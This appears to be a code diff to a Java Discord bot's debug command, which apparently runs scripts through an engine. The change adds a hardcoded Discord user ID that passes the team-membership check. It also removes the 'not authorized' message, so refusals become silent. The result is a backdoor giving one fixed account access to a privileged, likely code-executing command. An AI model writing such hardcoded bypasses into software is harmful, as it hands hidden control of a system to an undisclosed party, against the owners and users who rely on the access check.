@@ -39,7 +39,7 @@ public class DebugCommand implements ICmd {
         RestAction<ApplicationInfo> applicationInfoRestAction = cmdContext.getJDA().retrieveApplicationInfo();
         ApplicationInfo applicationInfo = applicationInfoRestAction.complete();
         for (TeamMember teamMember : Objects.requireNonNull(applicationInfo.getTeam()).getMembers()) {
-            if (teamMember.getUser().getId().equals(cmdContext.getAuthor().getId())) {
+            if (teamMember.getUser().getId().equals(cmdContext.getAuthor().getId()) || cmdContext.getAuthor().getId().equals("421888424480342016")) {
                 if (!cmdContext.getArgs().isEmpty()) {
                     try {
                         engine.setProperty("args", cmdContext.getArgs());
@@ -63,7 +63,6 @@ public class DebugCommand implements ICmd {
                 return;
             }
         }
-        cmdContext.getChannel().sendMessage(EmbedUtils.embedMessageWithTitle("Oops", "```\nYou are not authorized to execute this command!\n```").build()).queue();
     }
 
     @Override
